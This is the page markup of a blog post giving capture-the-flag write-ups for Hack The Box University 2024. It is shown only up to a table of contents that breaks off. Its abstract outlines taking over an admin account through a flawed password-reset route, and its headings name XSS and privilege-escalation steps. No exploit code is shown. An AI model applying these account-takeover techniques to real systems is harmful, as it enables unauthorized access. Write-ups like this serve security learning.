<!DOCTYPE html>
<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>Hack The Box University 2024 &middot; hibwyli</title>
  <meta name="title" content="Hack The Box University 2024 &middot; hibwyli" />
  
  <meta name="description" content="hibwyli&#39;s personal page" />
  <meta name="keywords" content="Web, " />
  
  
  <link rel="canonical" href="//localhost:1313/posts/htb/" />
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.cdc1fe204798901c9131bcb0b11d9890f76c487309656afdb3747de0a6ec1543f12053ad4c16f20265f0a8084f983200e42c6c7914ea17dc0e23a60c0310a49d.css"
    integrity="sha512-zcH&#43;IEeYkByRMbywsR2YkPdsSHMJZWr9s3R94KbsFUPxIFOtTBbyAmXwqAhPmDIA5CxseRTqF9wOI6YMAxCknQ==" />
  
  
  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.46679f17fbf901f57815383714249811464caf8189d5ad5270d299d23b5f80d1c7fdf5b12daeef5adc2599c74e9bc0495b89de0995fb0760d3600598348db9ef.js"
    integrity="sha512-RmefF/v5AfV4FTg3FCSYEUZMr4GJ1a1ScNKZ0jtfgNHH/fWxLa7vWtwlmcdOm8BJW4neCZX7B2DTYAWYNI257w==" data-copy="" data-copied=""></script>
  
  
  
  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
  
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
  <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:title" content="Hack The Box University 2024" />
<meta property="og:description" content="Write ups HTB UNIVERSITY # Web armaxis # Logic is only thing
Overview : # We are given a page and a email host to receive OTP. Main goal is to get access as an admin. We can abuse the forget password function to achieve change the admin password due to flaw in implementation.
router.post(&#34;/reset-password&#34;, async (req, res) =&gt; { const { token, newPassword, email } = req.body; // Added &#39;email&#39; parameter if (!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="//localhost:1313/posts/htb/" /><meta property="og:image" content="//localhost:1313/posts/htb/feature_wanna.jpg" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-08-27T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-08-27T00:00:00+00:00" />


  <meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="//localhost:1313/posts/htb/feature_wanna.jpg" /><meta name="twitter:title" content="Hack The Box University 2024"/>
<meta name="twitter:description" content="Write ups HTB UNIVERSITY # Web armaxis # Logic is only thing
Overview : # We are given a page and a email host to receive OTP. Main goal is to get access as an admin. We can abuse the forget password function to achieve change the admin password due to flaw in implementation.
router.post(&#34;/reset-password&#34;, async (req, res) =&gt; { const { token, newPassword, email } = req.body; // Added &#39;email&#39; parameter if (!"/>

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "Hack The Box University 2024",
    "headline": "Hack The Box University 2024",
    
    "abstract": "Write ups HTB UNIVERSITY # Web armaxis # Logic is only thing\nOverview : # We are given a page and a email host to receive OTP. Main goal is to get access as an admin. We can abuse the forget password function to achieve change the admin password due to flaw in implementation.\nrouter.post(\u0026#34;\/reset-password\u0026#34;, async (req, res) =\u0026gt; { const { token, newPassword, email } = req.body; \/\/ Added \u0026#39;email\u0026#39; parameter if (!",
    "inLanguage": "en",
    "url" : "\/\/localhost:1313\/posts\/htb\/",
    "author" : {
      "@type": "Person",
      "name": ""
    },
    "copyrightYear": "2024",
    "dateCreated": "2024-08-27T00:00:00\u002b00:00",
    "datePublished": "2024-08-27T00:00:00\u002b00:00",
    
    "dateModified": "2024-08-27T00:00:00\u002b00:00",
    
    "keywords": ["Web"],
    
    "mainEntityOfPage": "true",
    "wordCount": "4637"
  }]
  </script>


  
  
  
  
  

<script src="/lib/jquery/jquery.slim.min.7d88d2a1c0c3e9cb6e435406228f7e367f4e73899f6aed88884f0a8b5172315e0e704494b7cd4532a9a1b197bdcd667a83a35d733ac4300a2cd4694b2c08a95a.js" integrity="sha512-fYjSocDD6ctuQ1QGIo9&#43;Nn9Oc4mfau2IiE8Ki1FyMV4OcESUt81FMqmhsZe9zWZ6g6NdczrEMAos1GlLLAipWg=="></script>






















  
  



  
  
  <meta name="theme-color"/>
  
  
</head>
<body
  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
  <div id="the-top" class="absolute flex self-center">
    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
      href="#main-content"><span
        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
  </div>
  
  
  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            
            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">hibwyli</a>
            

        </nav>
        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">

            
            
            
  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        Posts
    </p>
</a>



            
            
  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        About
    </p>
</a>



            
            
  <a href="/categories/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        Categories
    </p>
</a>



            
            
  <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        Tags
    </p>
</a>



            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            
            <div
                class="ltr:mr-14 rtl:ml-14 flex items-center">
                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
                    <div class="flex items-center justify-center dark:hidden">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                    </div>
                    <div class="items-center justify-center hidden dark:flex">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                    </div>
                </button>
            </div>
            

        </nav>
        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            
            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
                <div class="flex items-center justify-center dark:hidden">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                </div>
                <div class="items-center justify-center hidden dark:flex">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                </div>
            </button>
            

        </div>
    </div>
    <div class="-my-2 -mr-2 md:hidden">

        <label id="menu-button" class="block">
            
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" style="padding-top:5px;"
                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li id="menu-close-button">
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    

                    
  <li class="mt-1">
    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Posts
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            About
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/categories/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Categories
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Tags
        </p>
    </a>
</li>




                    

                </ul>
                
                <hr>
                <ul
                    class="flex mt-4 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">


                    
                    <li class="mb-1">
                        <a href=""  class="flex items-center">
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="">
                                Pwnable
                            </p>
                        </a>
                    </li>
                    
                    <li class="mb-1">
                        <a href="/tags/web/"  class="flex items-center">
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="">
                                Web
                            </p>
                        </a>
                    </li>
                    
                    <li class="mb-1">
                        <a href=""  class="flex items-center">
                            
                            <span  class="mr-3" >
                                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


                            </span>
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="">
                                Write up
                            </p>
                        </a>
                    </li>
                    

                </ul>
                
                

            </div>
        </label>
    </div>
</div>


<div class="main-menu flex pb-3 flex-col items-end justify-between md:justify-start space-x-3" >
    <div class="hidden md:flex items-center space-x-5">
        
        <a href=""  class="flex items-center">
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="">
                Pwnable
            </p>
        </a>
        
        <a href="/tags/web/"  class="flex items-center">
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="">
                Web
            </p>
        </a>
        
        <a href=""  class="flex items-center">
            
            <span  class="mr-1" >
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


            </span>
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="">
                Write up
            </p>
        </a>
        
    </div>
</div>




  
  <div class="relative flex flex-col grow">
    <main id="main-content" class="grow">
      


<article>
  
  
  
  
  
  


<div id="hero" class="h-[150px] md:h-[200px]"></div>



    
    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
    style="background-image:url(/posts/htb/background.jpg);">
    


    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
    </div>
    <div
        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
    </div>
</div>

<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
<script>
    window.addEventListener('scroll', function (e) {
        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
        var background_blur = document.getElementById('background-blur');
        background_blur.style.opacity = (scroll / 300)
    });
</script>

  
  

  <header id="single_header" class="mt-5 max-w-prose">
    
    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/"
      >hibwyli</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline ">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/htb/"
      >Hack The Box University 2024</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


    
    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
      Hack The Box University 2024
    </h1>
    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
      





  
  







  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-08-27T00:00:00&#43;00:00">27 August 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">22 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/hibwyli/&#34;,'_self');return false;">Hibwyli</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
  </span>
  
  
  
  
</div>




    </div>

    
    
    
    
    

    

    
      
      
        
        
<div class="flex author">
  
  <div class="place-self-center">
    
    
    <div class="text-2xl sm:text-lg">
</div>
  </div>
</div>

      

      
        

      
      <div class="mb-5"></div>
      

    

  </header>
  
  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
    
     <div
      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">

         <details open id="TOCView"
  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#write-ups-htb-university">Write ups HTB UNIVERSITY</a></li>
    <li><a href="#web-armaxis">Web armaxis</a></li>
    <li><a href="#overview--">Overview  :</a></li>
    <li><a href="#admin">Admin</a></li>
    <li><a href="#web-breaking-bank">Web Breaking Bank</a></li>
    <li><a href="#goal">Goal</a></li>
    <li><a href="#overview">OVERVIEW</a></li>
    <li><a href="#lets-do-it">Let&rsquo;s do it</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#contract-front-end-write-ups">Contract Front End Write ups</a></li>
    <li><a href="#overview---1">Overview  :</a></li>
    <li><a href="#source-code-">Source code :</a></li>
    <li><a href="#finding-xss">Finding XSS</a></li>
    <li><a href="#how-to-this-xss-trigger-the-contract_manager">How to this XSS trigger the contract_manager</a></li>
    <li><a href="#gain-access-as-a-contract_manager-partly">Gain access as a contract_manager partly</a></li>
    <li><a href="#admin-privilege">ADMIN PRIVILEGE</a></li>
    <li><a href="#the-hard-things">The hard things</a></li>
    <li><a href="#conclusion-1">Conclusion</a></li>
    <li><a href="#web---intergalactic-bounty">Web - Intergalactic Bounty</a></li>
    <li><a href="#overview-1">Overview</a></li>
    <li><a href="#now-we-are-admins-">Now we are admins !!!</a></li>
    <li><a href="#research-about-nodemailer-behaviours">Research about NodeMailer behaviours</a>
      <ul>
        <li><a href="#main-steps">Main steps</a></li>
      </ul>
    </li>
    <li><a href="#lets-answer-the-questions">LET&rsquo;S ANSWER THE QUESTIONS</a></li>
    <li><a href="#conclusion-2">Conclusion</a></li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#write-ups-htb-university">Write ups HTB UNIVERSITY</a></li>
    <li><a href="#web-armaxis">Web armaxis</a></li>
    <li><a href="#overview--">Overview  :</a></li>
    <li><a href="#admin">Admin</a></li>
    <li><a href="#web-breaking-bank">Web Breaking Bank</a></li>
    <li><a href="#goal">Goal</a></li>
    <li><a href="#overview">OVERVIEW</a></li>
    <li><a href="#lets-do-it">Let&rsquo;s do it</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#contract-front-end-write-ups">Contract Front End Write ups</a></li>
    <li><a href="#overview---1">Overview  :</a></li>
    <li><a href="#source-code-">Source code :</a></li>
    <li><a href="#finding-xss">Finding XSS</a></li>
    <li><a href="#how-to-this-xss-trigger-the-contract_manager">How to this XSS trigger the contract_manager</a></li>
    <li><a href="#gain-access-as-a-contract_manager-partly">Gain access as a contract_manager partly</a></li>
    <li><a href="#admin-privilege">ADMIN PRIVILEGE</a></li>
    <li><a href="#the-hard-things">The hard things</a></li>
